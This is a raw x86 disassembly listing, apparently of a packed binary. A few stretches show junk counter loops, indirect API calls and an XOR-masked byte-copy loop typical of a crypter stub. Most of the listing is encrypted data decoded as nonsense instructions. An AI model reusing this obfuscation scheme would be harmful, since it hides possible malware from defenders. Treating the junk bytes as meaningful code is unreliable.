  40f35e:	dec    ecx
  40f35f:	(bad)  
  40f360:	int    0xf0
  40f362:	mov    eax,0xb2bcd60d
  40f367:	inc    ebp
  40f368:	and    eax,0x604a974b
  40f36d:	shl    eax,1
  40f36f:	xlat   BYTE PTR ds:[ebx]
  40f370:	test   DWORD PTR [ecx+eax*4-0x25aadc87],esp
  40f377:	outs   dx,DWORD PTR ds:[esi]
  40f378:	ja     0x40f39e
  40f37a:	pop    esp
  40f37b:	into   
  40f37c:	add    eax,0xf49a4993
  40f381:	inc    ecx
  40f382:	mov    eax,0xf89c8531
  40f387:	and    DWORD PTR ds:0x4338a7,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x4338a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4338a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4338a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4338a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4338a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4337ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433883
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4337d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4337d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4337d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4337d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4337d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43386f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43386f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43386f,ecx
  40f444:	cmp    DWORD PTR ds:0x43386f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43386f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43386f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43386f,ecx
  40f474:	cmp    DWORD PTR ds:0x43386f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43385b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43385b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43385b,edx
  40f498:	cmp    DWORD PTR ds:0x43385b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433a11
  40f4af:	push   0x433a67
  40f4b4:	push   0x433a4b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43385b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433897
  40f4d2:	adc    DWORD PTR ds:0x4338a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x47be8b39]
  40f540:	pop    ds
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	mov    ch,0xe1
  40f54b:	stos   BYTE PTR es:[edi],al
  40f54c:	pop    ecx
  40f54d:	retf   0xe96d
  40f550:	sbb    dh,BYTE PTR [ebp+0x4bdf7210]
  40f556:	fnstenv [eax-0x3f]
  40f559:	daa    
  40f55a:	inc    esi
  40f55b:	xor    esp,DWORD PTR [eax-0x58]
  40f55e:	mov    ecx,0x7d8f59
  40f563:	inc    eax
  40f564:	pop    eax
  40f565:	xlat   BYTE PTR ds:[ebx]
  40f566:	es mov eax,0x60dbaaf1
  40f56c:	jbe    0x40f533
  40f56e:	push   ebp
  40f56f:	cmc    
  40f570:	mov    ss,WORD PTR [ecx]
  40f572:	or     esi,DWORD PTR [edi+0x6243e970]
  40f578:	fidivr DWORD PTR [ecx+0x47]
  40f57b:	call   0x91b1:0x4c99e9d2
  40f582:	sbb    BYTE PTR [eax+0x3cb50a0b],al
  40f588:	mov    ebx,0xc15868cb
  40f58d:	fstp   TBYTE PTR ds:0x157ad9fd
  40f593:	xchg   edi,eax
  40f594:	loope  0x40f593
  40f596:	(bad)  
  40f597:	mov    edi,0xd0fc3d1
  40f59c:	mov    bl,0x5b
  40f59e:	in     eax,dx
  40f59f:	adc    eax,0x435f21e6
  40f5a4:	imul   BYTE PTR [ebp+0x798abb42]
  40f5aa:	pop    esp
  40f5ab:	pop    ecx
  40f5ac:	iret   
  40f5ad:	jns    0x40f5a2
  40f5af:	pop    ds
  40f5b0:	frstor [esi+ebp*1+0x55]
  40f5b4:	cmc    
  40f5b5:	ds (bad) 
  40f5b8:	imul   edi,DWORD PTR [esi+0x4efb18c8],0xcf64f0d0
  40f5c2:	cmp    BYTE PTR [esi+0x2456c4dd],0x22
  40f5c9:	push   0xffffffb4
  40f5cb:	sbb    edi,edi
  40f5cd:	fstp   QWORD PTR [esp+ebx*1-0x76]
  40f5d1:	and    al,0x5f
  40f5d3:	inc    ebp
  40f5d4:	jmp    FWORD PTR [edx]
  40f5d6:	lahf   
  40f5d7:	repnz or al,0xf7
  40f5da:	out    dx,al
  40f5db:	xchg   BYTE PTR [edx],bl
  40f5dd:	out    dx,eax
  40f5de:	add    BYTE PTR [edx+0x6b5d613e],dh
  40f5e4:	jp     0x40f64d
  40f5e6:	fwait
  40f5e7:	and    esp,DWORD PTR [bp+si-0x3a]
  40f5eb:	lds    esi,FWORD PTR [eax]
  40f5ed:	jno    0x40f5ec
  40f5ef:	adc    ebp,esp
  40f5f1:	mov    bh,0xc7
  40f5f3:	mov    eax,ds:0x7bdbdcc5
  40f5f8:	and    dh,BYTE PTR [esi-0x5a]
  40f5fb:	xor    al,0xe6
  40f5fd:	mov    eax,ds:0x9ca0a68c
  40f602:	jp     0x40f64e
  40f604:	xchg   edi,eax
  40f605:	jns    0x40f59a
  40f607:	jo     0x40f5d7
  40f609:	mov    bh,0xf2
  40f60b:	mov    esi,0x563fa030
  40f610:	jecxz  0x40f665
  40f612:	sub    ah,0x57
  40f615:	dec    edx
  40f616:	ret    0x89ea
  40f619:	and    bl,dl
  40f61b:	adc    ecx,DWORD PTR [eax]
  40f61d:	stc    
  40f61e:	sub    al,BYTE PTR [ebx+0x54]
  40f621:	add    BYTE PTR [eax-0x7caafbd7],0x66
  40f628:	rcl    eax,0xc1
  40f62b:	jge    0x40f5f6
  40f62d:	outs   dx,BYTE PTR ds:[esi]
  40f62e:	fld    TBYTE PTR [edi+ebx*2-0x1d]
  40f632:	cli    
  40f633:	sub    edi,esp
  40f635:	inc    ebx
  40f636:	cld    
  40f637:	mov    cl,0xfd
  40f639:	mov    ecx,0x34d7f9fa
  40f63e:	jmp    0x54e7ab88
  40f643:	inc    ebx
  40f644:	mov    ah,0x37
  40f646:	jmp    0xcad9:0x25078bee
  40f64d:	mov    dh,0x7c
  40f64f:	stc    
  40f650:	xor    bh,0xf
  40f653:	neg    DWORD PTR [esi]
  40f655:	paddd  mm6,QWORD PTR [edi-0x2b36e08e]
  40f65c:	push   eax
  40f65d:	int    0xa7
  40f65f:	xor    ch,BYTE PTR [ecx-0x65]
  40f662:	dec    esp
  40f663:	repz repz call 0xbe408e61
  40f66a:	js     0x40f6a3
  40f66c:	retf   0x9388
  40f66f:	div    DWORD PTR [ebx+0x14]
  40f672:	pop    esp
  40f674:	mov    bh,BYTE PTR [ebp+0x18]
  40f677:	icebp  
  40f678:	ret    0x81b0
  40f67b:	sbb    bl,bl
  40f67d:	in     eax,dx
  40f67e:	arpl   sp,bx
  40f680:	pop    ss
  40f681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f682:	out    dx,al
  40f683:	jae    0x40f61c
  40f685:	inc    ecx
  40f686:	jp     0x40f619
  40f688:	jge    0x40f6a4
  40f68a:	sahf   
  40f68b:	jmp    DWORD PTR fs:[ecx]
  40f68e:	aam    0x72
  40f690:	cmp    DWORD PTR [edi-0x4256777c],0xffffffa7
  40f697:	gs mov ecx,0x258bcf11
  40f69d:	outs   dx,BYTE PTR ds:[esi]
  40f69e:	ins    BYTE PTR es:[edi],dx
  40f69f:	mov    ah,0x79
  40f6a1:	xor    DWORD PTR [eax+0x67be0f97],0xffffffba
  40f6a8:	and    eax,0x187b9670
  40f6ad:	and    BYTE PTR [ebx],0xcf
  40f6b0:	retf   
  40f6b1:	nop
  40f6b2:	push   0xffffff93
  40f6b4:	popa   
  40f6b5:	rcr    DWORD PTR [edi],0x9c
  40f6b8:	iret   
  40f6b9:	mov    ecx,DWORD PTR [esi]
  40f6bb:	sbb    dh,bl
  40f6bd:	push   ebp
  40f6be:	icebp  
  40f6bf:	add    eax,0x139108cb
  40f6c4:	addr16 das 
  40f6c6:	or     ebp,esi
  40f6c8:	mov    ds:0x45e9091a,eax
  40f6cd:	retf   0x3f00
  40f6d0:	loop   0x40f6d8
  40f6d2:	mov    ds:0x9f723f60,eax
  40f6d7:	scas   al,BYTE PTR es:[edi]
  40f6d8:	inc    ebx
  40f6d9:	cli    
  40f6da:	sbb    al,0xa8
  40f6dc:	repz ror al,0x17
  40f6e0:	ja     0x40f6bb
  40f6e2:	ss xchg esp,eax
  40f6e4:	add    eax,0x8d30c177
  40f6e9:	xchg   esi,eax
  40f6ea:	daa    
  40f6eb:	mov    ds:0x2af02086,eax
  40f6f0:	cdq    
  40f6f1:	test   DWORD PTR ds:0x2777c805,esp
  40f6f7:	jns    0x40f692
  40f6f9:	das    
  40f6fa:	loope  0x40f6e4
  40f6fc:	pop    ss
  40f6fd:	or     DWORD PTR [esp+edx*8],0xaa4d74fb
  40f704:	(bad)  
  40f705:	out    0xc,al
  40f707:	push   cs
  40f708:	sub    al,0xda
  40f70a:	jle    0x40f742
  40f70c:	ror    BYTE PTR [ebp+0x2019389a],1
  40f712:	shl    ebp,1
  40f714:	xor    al,0xe7
  40f716:	fwait
  40f717:	stos   DWORD PTR es:[edi],eax
  40f718:	push   edx
  40f719:	mov    bl,0x30
  40f71b:	jg     0x40f6ad
  40f71d:	(bad)  
  40f71e:	push   ecx
  40f71f:	(bad)  
  40f720:	int3   
  40f721:	enter  0xf174,0x7b
  40f725:	mov    esi,0x103db339
  40f72a:	ss repz in eax,dx
  40f72d:	iret   
  40f72e:	fcom   DWORD PTR [ebp-0x384c0694]
  40f734:	aaa    
  40f735:	in     al,dx
  40f736:	ins    DWORD PTR es:[edi],dx
  40f737:	cmp    eax,0x9527ec84
  40f73c:	mov    eax,ds:0xe7038014
  40f741:	retf   
  40f742:	and    al,0x19
  40f744:	or     dl,dh
  40f746:	dec    esp
  40f747:	jno    0x40f7bc
  40f749:	jmp    0xe104b71e
  40f74e:	inc    ebx
  40f74f:	sbb    al,0x31
  40f751:	lods   eax,DWORD PTR ds:[esi]
  40f752:	and    al,0x85
  40f754:	mov    ah,0xde
  40f756:	or     DWORD PTR [eax+edi*2],ebx
  40f759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f75a:	add    bl,BYTE PTR [eax+0x8]
  40f75d:	nop
  40f75e:	fbld   TBYTE PTR [eax-0x5c]
  40f761:	cmc    
  40f762:	xchg   BYTE PTR [ebx+0x6b],bl
  40f765:	mov    edi,0x76b06ab
  40f76a:	ds mov ebx,0x72fda0b5
  40f770:	jmp    0x40f705
  40f772:	xchg   BYTE PTR [eax+0x8],dh
  40f775:	(bad)  
  40f776:	bound  ebp,QWORD PTR [ebp+0x5f]
  40f779:	por    mm5,mm6
  40f77c:	add    bl,ah
  40f77e:	into   
  40f77f:	shr    BYTE PTR [edi-0x74],1
  40f782:	loopne 0x40f7fd
  40f784:	imul   eax,DWORD PTR [ecx],0x61
  40f787:	cld    
  40f788:	sbb    al,0xae
  40f78a:	(bad)  
  40f78d:	and    eax,0xecb166c
  40f792:	aaa    
  40f793:	(bad)  
  40f794:	jecxz  0x40f7ce
  40f796:	mov    ds:0x193d3507,al
  40f79b:	jne    0x40f748
  40f79d:	xchg   ecx,eax
  40f79e:	jnp    0x40f731
  40f7a0:	ds sti 
  40f7a2:	xchg   ecx,eax
  40f7a3:	imul   edi,DWORD PTR [ebp-0x7c3a39f9],0x3e
  40f7aa:	aad    0x11
  40f7ac:	hlt    
  40f7ad:	cs sahf 
  40f7af:	cs pop edi
  40f7b1:	mov    esp,0xed549020
  40f7b6:	mov    esi,0x21724465
  40f7bb:	div    BYTE PTR [ebx]
  40f7bd:	(bad)  
  40f7be:	add    eax,0xfa8ee786
  40f7c3:	xor    BYTE PTR [eax-0x3026862],ah
  40f7c9:	adc    DWORD PTR ds:0xd3b7604d,0xffffffb1
  40f7d0:	nop
  40f7d1:	ds mov cs,esi
  40f7d4:	ror    DWORD PTR [edi+eax*8-0x718a02c],1
  40f7db:	inc    ebp
  40f7dc:	mov    ecx,0x4920c23
  40f7e1:	cli    
  40f7e2:	mov    cl,0x9c
  40f7e4:	outs   dx,BYTE PTR ds:[esi]
  40f7e5:	or     esi,edx
  40f7e7:	or     eax,ebp
  40f7e9:	cld    
  40f7ea:	enter  0xe40f,0xf6
  40f7ee:	pop    ss
  40f7ef:	stc    
  40f7f0:	mov    ebp,0x47df80bb
  40f7f5:	fs je  0x40f82a
  40f7f8:	test   DWORD PTR [edi-0x59f92314],esi
  40f7fe:	adc    al,0x21
  40f800:	xor    eax,0xa4010aad
  40f805:	xor    edx,DWORD PTR [edx]
  40f807:	sbb    dh,dl
  40f809:	push   es
  40f80a:	mov    ds:0x994c3e48,eax
  40f80f:	sub    ah,ah
  40f811:	push   ebp
  40f812:	in     al,0x8b
  40f814:	sbb    dl,bh
  40f816:	call   0xf08df234
  40f81b:	out    dx,al
  40f81c:	mov    ecx,0xb67fef5
  40f821:	or     al,0xa4
  40f823:	push   0xd24b87dc
  40f828:	and    BYTE PTR [ebp+ebp*2-0x2b4a0b79],bl
  40f82f:	icebp  
  40f830:	ins    DWORD PTR es:[edi],dx
  40f831:	xchg   esi,eax
  40f832:	data16 add al,0x4
  40f835:	scas   al,BYTE PTR es:[edi]
  40f836:	push   esi
  40f837:	xor    BYTE PTR [ebp-0x55343243],al
  40f83d:	and    al,0x25
  40f83f:	repz and DWORD PTR [ebp+0x4bc6396d],esp
  40f846:	enter  0xdf91,0xf9
  40f84a:	mov    esp,0xfe03f933
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xc710dd3f
  40f897:	rcl    edx,0xab
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	vcmpss xmm7,xmm7,DWORD PTR [ecx-0x16],0x66
  40f8a6:	js     0x40f86e
  40f8a8:	xor    dh,BYTE PTR [edi]
  40f8aa:	push   edi
  40f8ab:	adc    DWORD PTR [esi+0x12],0xffffffd9
  40f8af:	les    esp,FWORD PTR [edi+0x53]
  40f8b2:	and    DWORD PTR [edi+0x29],ebp
  40f8b5:	call   0x24e0:0x47fd5bec
  40f8bc:	xchg   esp,eax
  40f8bd:	pop    ecx
  40f8be:	pop    esp
  40f8bf:	fsub   DWORD PTR [edx+0x29]
  40f8c2:	dec    ecx
  40f8c3:	or     BYTE PTR [ebp+0x10cb119b],0xa1
  40f8ca:	lods   al,BYTE PTR ds:[esi]
  40f8cb:	pop    esp
  40f8cc:	xchg   edi,eax
  40f8cd:	(bad)  
  40f8ce:	add    dh,dl
  40f8d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d1:	pop    ss
  40f8d2:	or     DWORD PTR [ebx-0x7a],esp
  40f8d5:	(bad)  
  40f8d7:	sub    DWORD PTR [ecx+0x1f8b56ac],0x77
  40f8de:	pop    edi
  40f8df:	int3   
  40f8e0:	shr    BYTE PTR [eax],1
  40f8e2:	xchg   ecx,eax
  40f8e3:	bound  esp,QWORD PTR [edi+0x4879d423]
  40f8e9:	cmp    bl,cl
  40f8eb:	adc    BYTE PTR [edi-0x6b91ae7e],dh
  40f8f1:	retf   
  40f8f2:	push   esp
  40f8f3:	fidivr WORD PTR [edx]
  40f8f5:	push   0x5bb1faf4
  40f8fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8fb:	popf   
  40f8fc:	and    al,0xc6
  40f8fe:	(bad)  
  40f8ff:	sub    ebp,DWORD PTR [ebx+0x29]
  40f902:	lock loope 0x40f93f
  40f905:	aam    0x19
  40f907:	in     al,0xae
  40f909:	std    
  40f90a:	scas   eax,DWORD PTR es:[edi]
  40f90b:	sbb    eax,0xba378190
  40f910:	mov    ebp,0xce3154eb
  40f915:	cmp    DWORD PTR [edx+0x5b8f4443],ebp
  40f91b:	clc    
  40f91c:	add    eax,0x8444aea3
  40f921:	add    bl,BYTE PTR [ebx-0x36e5251b]
  40f927:	jmp    0x40f8b3
  40f929:	mov    ds:0x4e5b6051,al
  40f92e:	popf   
  40f92f:	dec    edx
  40f930:	(bad)  
  40f931:	jmp    0x40f975
  40f933:	jge    0x40f8c9
  40f935:	aam    0xc6
  40f937:	push   ecx
  40f938:	jmp    DWORD PTR [ecx-0x3a1b83fd]
  40f93e:	mov    eax,ds:0xa95b1a42
  40f943:	xor    bh,ah
  40f945:	push   ebx
  40f946:	mov    esi,0x3016a3a4
  40f94b:	lods   al,BYTE PTR ds:[esi]
  40f94c:	pushf  
  40f94d:	cmc    
  40f94e:	cmp    edx,edx
  40f950:	je     0x40f942
  40f952:	sahf   
  40f953:	aad    0x32
  40f955:	(bad)  
  40f956:	mov    ebx,0xa383ac99
  40f95b:	xor    ebx,DWORD PTR [eax-0x6a922012]
  40f961:	loope  0x40f9e1
  40f963:	and    DWORD PTR gs:[ebp-0x2f],0x89154eb7
  40f96b:	pop    ecx
  40f96c:	jb     0x40f9e9
  40f96e:	mov    ds:0x4ca288b4,al
  40f973:	mov    ?,WORD PTR [edi]
  40f975:	adc    DWORD PTR [ebx-0x2a],esi
  40f978:	int3   
  40f979:	fs mov esi,ebp
  40f97c:	cs jae 0x40f9eb
  40f97f:	mov    ebp,0x4f0f5def
  40f984:	jg     0x40f9d4
  40f986:	mov    WORD PTR [edi-0x4c],?
  40f989:	inc    ecx
  40f98a:	jne    0x40f96b
  40f98c:	ja     0x40f94c
  40f98e:	push   ecx
  40f98f:	stc    
  40f990:	xor    al,0x82
  40f992:	dec    edi
  40f993:	xchg   ebp,eax
  40f994:	in     eax,dx
  40f995:	fisttp WORD PTR [esi]
  40f997:	push   edi
  40f998:	xchg   ebp,eax
  40f999:	push   ebp
  40f99a:	clc    
  40f99b:	sbb    DWORD PTR [eax+0x75a27dad],edx
  40f9a1:	retf   
  40f9a2:	rcr    ch,1
  40f9a4:	inc    ebp
  40f9a5:	jo     0x40f993
  40f9a7:	mov    bl,0x2
  40f9a9:	push   esi
  40f9aa:	and    ecx,ecx
  40f9ac:	mov    bl,0x67
  40f9ae:	xor    ch,BYTE PTR [esi+ecx*4]
  40f9b1:	mov    al,0x7
  40f9b3:	loope  0x40f945
  40f9b5:	or     edx,DWORD PTR [ebx+esi*4-0x67]
  40f9b9:	jb     0x40f94c
  40f9bb:	in     eax,0xe1
  40f9bd:	push   sp
  40f9bf:	jmp    0x40f9bc
  40f9c1:	jb     0x40f9ea
  40f9c3:	adc    BYTE PTR [ecx],bh
  40f9c5:	sbb    eax,0x3c42d75b
  40f9ca:	mov    al,ds:0xf4f2c1f0
  40f9cf:	pop    es
  40f9d0:	stc    
  40f9d1:	pop    esi
  40f9d2:	ret    
  40f9d3:	lods   eax,DWORD PTR ds:[esi]
  40f9d4:	pop    ebx
  40f9d5:	cmp    esi,DWORD PTR [edx-0x7bd27ee]
  40f9db:	icebp  
  40f9dc:	lods   al,BYTE PTR ds:[esi]
  40f9dd:	nop
  40f9de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9df:	jno    0x40fa3d
  40f9e1:	mov    al,ds:0x304a038b
  40f9e6:	outs   dx,BYTE PTR ds:[esi]
  40f9e7:	dec    ecx
  40f9e8:	push   0x5167ec22
  40f9ed:	cmp    eax,0x42895c02
  40f9f2:	cmp    eax,0xffb529ba
  40f9f7:	dec    esp
  40f9f8:	pop    esp
  40f9f9:	push   ecx
  40f9fa:	or     ah,BYTE PTR [eax]
  40f9fc:	xchg   ecx,eax
  40f9fd:	sbb    al,0x4a
  40f9ff:	(bad)  
  40fa00:	jmp    0x40fa3e
  40fa02:	push   0x6a400205
  40fa07:	sub    al,0x14
  40fa09:	xor    DWORD PTR [ebx+0x3f90417b],edx
  40fa0f:	xchg   ecx,eax
  40fa10:	daa    
  40fa11:	mov    edi,0xd72ce6a9
  40fa16:	push   ebx
  40fa17:	icebp  
  40fa18:	jb     0x40fa51
  40fa1a:	add    eax,0x353d161f
  40fa1f:	xchg   DWORD PTR [edi+edx*1+0x63512a8],esp
  40fa26:	sub    ch,bh
  40fa28:	mov    bl,BYTE PTR [ebx]
  40fa2a:	jb     0x40fa57
  40fa2c:	jg     0x40fa7c
  40fa2e:	xchg   DWORD PTR [eax],ecx
  40fa30:	test   al,0x8
  40fa32:	inc    ecx
  40fa33:	push   esp
  40fa34:	(bad)  
  40fa35:	cmp    ebp,DWORD PTR [ecx+0x757f0759]
  40fa3b:	aam    0x98
  40fa3d:	data16 and ah,BYTE PTR [esi+0x11]
  40fa41:	xchg   esp,eax
  40fa42:	outs   dx,DWORD PTR ds:[esi]
  40fa43:	hlt    
  40fa44:	mov    DWORD PTR [eax],ebp
  40fa46:	ja     0x40fa86
  40fa48:	loope  0x40fa9f
  40fa4a:	xabort 0xf9
  40fa4d:	outs   dx,BYTE PTR ds:[esi]
  40fa4e:	push   ss
  40fa4f:	cld    
  40fa50:	sub    ebx,DWORD PTR [esp+eax*4-0x26]
  40fa54:	fmul   QWORD PTR [ebx-0x50]
  40fa57:	push   ebp
  40fa58:	in     al,0x32
  40fa5a:	call   0xaf4f:0x7733c93f
  40fa61:	in     al,dx
  40fa62:	popa   
  40fa63:	sahf   
  40fa64:	adc    edi,edx
  40fa66:	jbe    0x40fa5c
  40fa68:	adc    BYTE PTR [ecx-0x67],bh
  40fa6b:	je     0x40fac6
  40fa6d:	daa    
  40fa6e:	loope  0x40f9f6
  40fa70:	or     DWORD PTR [ecx],edi
  40fa72:	stos   DWORD PTR es:[edi],eax
  40fa73:	in     al,0x4b
  40fa75:	ficom  WORD PTR [edi-0x78380be0]
  40fa7b:	mov    ah,BYTE PTR [edi]
  40fa7d:	nop
  40fa7e:	push   es
  40fa7f:	mov    ecx,DWORD PTR [edx-0x3f]
  40fa82:	xchg   esp,eax
  40fa83:	lock sbb DWORD PTR [ebx+0x18],0x269c5c38
  40fa8b:	adc    eax,0x90714b79
  40fa90:	aas    
  40fa91:	ret    0x34cb
  40fa94:	rcr    BYTE PTR ds:0xec0f2a17,cl
  40fa9a:	push   es
  40fa9b:	imul   edx,DWORD PTR [ecx+0x225fd5d7],0x7da9f600
  40faa5:	aas    
  40faa6:	in     eax,dx
  40faa7:	int    0x5
  40faa9:	pop    es
  40faaa:	test   ebp,eax
  40faac:	ins    BYTE PTR es:[edi],dx
  40faad:	sbb    ah,BYTE PTR [ecx-0x4a]
  40fab0:	xor    edi,DWORD PTR [edx-0x52]
  40fab3:	xor    DWORD PTR [ebp-0x5f],esi
  40fab6:	cmp    al,0xd5
  40fab8:	xlat   BYTE PTR ds:[ebx]
  40fab9:	adc    DWORD PTR [eax-0x12],eax
  40fabc:	(bad)  
  40fabd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fabe:	sahf   
  40fabf:	sar    DWORD PTR [ecx],cl
  40fac1:	aam    0xf3
  40fac3:	jge    0x40faf0
  40fac5:	ret    
  40fac6:	mov    esp,0x136d259
  40facb:	fild   QWORD PTR [edi+0x9]
  40face:	icebp  
  40facf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fad0:	dec    esp
  40fad1:	mov    ebp,0x8cddf5cd
  40fad6:	cs inc ecx
  40fad8:	nop
  40fad9:	outs   dx,DWORD PTR ds:[esi]
  40fada:	jb     0x40fa9c
  40fadc:	mov    ebp,0x3d207075
  40fae1:	jnp    0x40fb13
  40fae3:	repz popa 
  40fae5:	mov    ds:0x3f6d4775,eax
  40faea:	aas    
  40faeb:	es ins BYTE PTR es:[edi],dx
  40faed:	scas   eax,DWORD PTR es:[edi]
  40faee:	and    ecx,0xff1e567a
  40faf4:	sbb    ebp,DWORD PTR [ecx+ebx*2]
  40faf7:	cwde   
  40faf8:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40fafa:	pop    esp
  40fafb:	enter  0xecfc,0x19
  40faff:	test   DWORD PTR [edx-0x31637e2d],edi
  40fb05:	shl    BYTE PTR [eax],cl
  40fb07:	jle    0x40fb55
  40fb09:	out    0xe6,eax
  40fb0b:	and    DWORD PTR [ebp-0x3607d6ed],ebp
  40fb11:	rcr    BYTE PTR [eax+0x51f856ae],1
  40fb17:	jmp    0xca18:0x14417fa8
  40fb1e:	jmp    0x7346:0x88188cc
  40fb25:	or     edx,ebp
  40fb27:	data16 js 0x40fb7f
  40fb2a:	mov    ds:0xb81aa338,ax
  40fb30:	lods   al,BYTE PTR ds:[esi]
  40fb31:	or     eax,0x1e6615dd
  40fb36:	jbe    0x40faf1
  40fb38:	or     eax,0xd64f40b4
  40fb3d:	and    dh,BYTE PTR [edi]
  40fb3f:	outs   dx,DWORD PTR ds:[esi]
  40fb40:	xchg   esi,eax
  40fb41:	inc    ebp
  40fb42:	test   DWORD PTR [edx],edx
  40fb44:	mov    ch,0x76
  40fb46:	stos   BYTE PTR es:[edi],al
  40fb47:	xchg   DWORD PTR [edi+0x6406c8e6],ebp
  40fb4d:	push   esp
  40fb4e:	xor    DWORD PTR [edi+eax*4+0x68],edx
  40fb52:	icebp  
  40fb53:	rcl    bl,cl
  40fb55:	das    
  40fb56:	or     BYTE PTR [ebx+0x48bb770e],bh
  40fb5c:	enter  0xdc84,0x68
  40fb60:	xor    ah,BYTE PTR [ebx+0x67]
  40fb63:	add    esp,esp
  40fb65:	xchg   esp,eax
  40fb66:	ror    DWORD PTR [edi],cl
  40fb68:	dec    eax
  40fb69:	inc    ecx
  40fb6a:	dec    esi
  40fb6b:	mov    dh,0xa2
  40fb6d:	jecxz  0x40fb75
  40fb6f:	frstor [ecx-0x39d85df3]
  40fb75:	jmp    0xc7b8:0x8b5160f7
  40fb7c:	push   ecx
  40fb7d:	cdq    
  40fb7e:	xchg   ebp,eax
  40fb7f:	fwait
  40fb80:	cli    
  40fb81:	pop    ebx
  40fb82:	pop    ecx
  40fb83:	cmp    BYTE PTR [edi-0x62],bh
  40fb86:	jmp    0x47105185
  40fb8b:	inc    edi
  40fb8c:	push   edx
  40fb8d:	ss int3 
  40fb8f:	inc    esi
  40fb90:	test   BYTE PTR [ecx+0x48],ch
  40fb93:	adc    DWORD PTR [eax],esi
  40fb95:	push   ss
  40fb96:	push   ss
